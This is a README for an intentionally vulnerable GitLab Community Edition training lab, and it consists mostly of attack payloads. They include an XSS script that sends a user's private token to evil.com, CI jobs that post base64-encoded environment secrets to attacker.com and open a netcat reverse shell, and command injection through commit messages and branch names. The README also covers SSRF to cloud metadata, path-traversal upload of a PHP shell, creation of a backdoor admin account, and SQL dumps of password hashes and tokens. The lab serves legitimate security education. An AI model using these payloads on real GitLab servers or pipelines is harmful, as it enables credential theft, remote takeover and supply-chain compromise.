# GitLab CE Vulnerable

## Overview
A vulnerable GitLab Community Edition instance configured with common security misconfigurations and known vulnerabilities, designed for learning GitLab security and DevOps pipeline attacks.

## Quick Start

**Access URL**: http://localhost:8088

**HTTPS URL**: https://localhost:8444 (self-signed certificate)

**SSH Access**: `ssh git@localhost -p 2223`

**Initial Setup**:
1. First access will prompt for root password setup
2. Set root password (minimum 8 characters)
3. Default username: `root`

**Note**: GitLab takes 5-10 minutes to fully start. Check status:
```bash
docker logs gitlab-vulnerable 2>&1 | grep "gitlab Reconfigured!"
```

## GitLab Features

- Git repository hosting
- CI/CD pipelines
- Issue tracking
- Wiki pages
- Container registry
- User/Group management
- Webhooks
- API access

## Vulnerabilities

### 1. Weak Default Configuration
```yaml
# Insecure GitLab settings
gitlab_rails['initial_root_password'] = 'password123'
gitlab_rails['gitlab_shell_ssh_port'] = 2223
nginx['enable'] = true
nginx['redirect_http_to_https'] = false
```

### 2. CI/CD Pipeline Command Injection
```yaml
# .gitlab-ci.yml
test:
  script:
    - echo "Testing $CI_COMMIT_MESSAGE"
    - eval "$CUSTOM_COMMAND"
    
# Attack via commit message
git commit -m "; cat /etc/passwd > public/leaked.txt"
```

### 3. Webhook SSRF
```ruby
# Webhook URL validation bypass
http://0.0.0.0:6379/
http://127.0.0.1:6379/
http://localhost:6379/
http://[::1]:6379/
http://169.254.169.254/latest/meta-data/

# GitLab internal services
http://localhost:9090/  # Prometheus
http://localhost:5000/  # Container registry
```

### 4. Git Command Injection
```bash
# Via malicious branch names
git push origin 'master;cat /etc/passwd'

# Via submodules
[submodule "evil"]
    path = evil
    url = ssh://git@localhost/../../etc/passwd
```

### 5. Container Registry Exploitation
```bash
# Pull without authentication
docker pull localhost:5000/project/image

# Push malicious image
docker tag evil:latest localhost:5000/victim/backdoor
docker push localhost:5000/victim/backdoor
```

### 6. GraphQL API Information Disclosure
```graphql
# Access without authentication
{
  users {
    nodes {
      username
      email
      state
      createdAt
    }
  }
}

# Extract projects
{
  projects {
    nodes {
      name
      visibility
      httpUrlToRepo
    }
  }
}
```

### 7. Stored XSS in Multiple Locations
```markdown
# In Wiki pages
<img src=x onerror="alert(document.cookie)">

# In issues
[Click me](javascript:alert('XSS'))

# In merge request descriptions
<script>fetch('/api/v4/user').then(r=>r.json()).then(d=>fetch('http://evil.com/'+d.private_token))</script>
```

### 8. Path Traversal in File Uploads
```bash
# Upload with directory traversal
curl -X POST http://localhost:8088/api/v4/projects/1/uploads \
  -H "PRIVATE-TOKEN: token" \
  -F "file=@shell.php" \
  -F "filename=../../../public/shell.php"
```

### 9. Privilege Escalation via Impersonation
```ruby
# Admin can impersonate users
# But impersonation tokens aren't properly restricted
POST /api/v4/users/2/impersonation_tokens
{
  "name": "evil",
  "scopes": ["api", "sudo"]
}
```

### 10. Insecure Direct Object Reference
```bash
# Access private projects
curl http://localhost:8088/api/v4/projects/1
curl http://localhost:8088/api/v4/projects/2
curl http://localhost:8088/api/v4/projects/3

# Download artifacts without auth
curl http://localhost:8088/project/repo/-/jobs/1/artifacts/download
```

## CI/CD Pipeline Attacks

### 1. Secret Extraction
```yaml
# .gitlab-ci.yml
steal_secrets:
  script:
    - echo $CI_JOB_TOKEN
    - env | base64 | curl -X POST http://attacker.com/ -d @-
    - cat ~/.docker/config.json
```

### 2. Backdoor via CI/CD
```yaml
deploy:
  script:
    - apt-get update && apt-get install -y netcat
    - nohup nc -e /bin/bash attacker.com 4444 &
    - echo "Deploy completed"
```

### 3. Supply Chain Attack
```yaml
build:
  script:
    - sed -i 's/return true/return false/g' src/auth.js
    - npm run build
```

## Post-Exploitation

### 1. GitLab Rails Console
```bash
# If you have shell access
gitlab-rails console

# Create admin user
user = User.new(username: 'hacker', email: 'hacker@evil.com', name: 'Hacker', password: 'password123')
user.admin = true
user.skip_confirmation!
user.save!

# Extract tokens
PersonalAccessToken.all.each { |t| puts "#{t.user.username}: #{t.token}" }
```

### 2. Database Access
```bash
# PostgreSQL access
gitlab-psql -d gitlabhq_production

# Dump users
SELECT username, email, encrypted_password FROM users;

# Extract tokens
SELECT * FROM personal_access_tokens;
```

### 3. Redis Exploitation
```bash
# Access Redis
redis-cli

# Get all keys
KEYS *

# Extract sessions
GET session:gitlab:*
```

## Common Misconfigurations

1. **Public project visibility by default**
2. **Self-registration enabled**
3. **Weak password requirements**
4. **No 2FA enforcement**
5. **Unrestricted file uploads**
6. **Public pipelines**
7. **Insecure webhooks**

## GitLab API Exploitation

### Authentication Tokens
```bash
# Personal Access Token
curl -H "PRIVATE-TOKEN: glpat-xxxxxxxxxxxxxxxxxxxx" http://localhost:8088/api/v4/user

# OAuth Token
curl -H "Authorization: Bearer xxxxxxxxxxxxxxxxxxxx" http://localhost:8088/api/v4/user

# Session Cookie
curl -H "Cookie: _gitlab_session=xxxxx" http://localhost:8088/api/v4/user
```

### Useful API Endpoints
```bash
# List all projects
curl http://localhost:8088/api/v4/projects

# List all users (if public)
curl http://localhost:8088/api/v4/users

# Get user by ID
curl http://localhost:8088/api/v4/users/1

# Search code
curl "http://localhost:8088/api/v4/search?scope=blobs&search=password"
```

## Security Features (Often Disabled)

- ❌ Container scanning
- ❌ Dependency scanning
- ❌ SAST (Static Application Security Testing)
- ❌ Secret detection
- ❌ License compliance
- ❌ DAST (Dynamic Application Security Testing)
- ❌ API fuzzing

## Testing Tools

### GitLab Security Scanner
```bash
# Clone and scan
git clone http://localhost:8088/project/repo.git
gitleaks detect --source=repo/

# Check for secrets
trufflehog git http://localhost:8088/project/repo.git
```

### API Testing
```bash
# Enumerate endpoints
wfuzz -c -z file,/usr/share/wordlists/common.txt \
  -H "PRIVATE-TOKEN: token" \
  http://localhost:8088/api/v4/FUZZ

# Test for SSRF
curl -X POST http://localhost:8088/api/v4/projects/1/hooks \
  -H "PRIVATE-TOKEN: token" \
  -d "url=http://169.254.169.254/"
```

## Learning Objectives
- Understanding GitLab security architecture
- CI/CD pipeline security
- Supply chain attacks
- Git-based vulnerabilities
- API security testing
- DevSecOps practices

## Additional Resources
- [GitLab Security Documentation](https://docs.gitlab.com/ee/security/)
- [OWASP DevSecOps Guideline](https://owasp.org/www-project-devsecops-guideline/)
- [GitLab CVE List](https://www.cvedetails.com/vendor/13074/Gitlab.html) 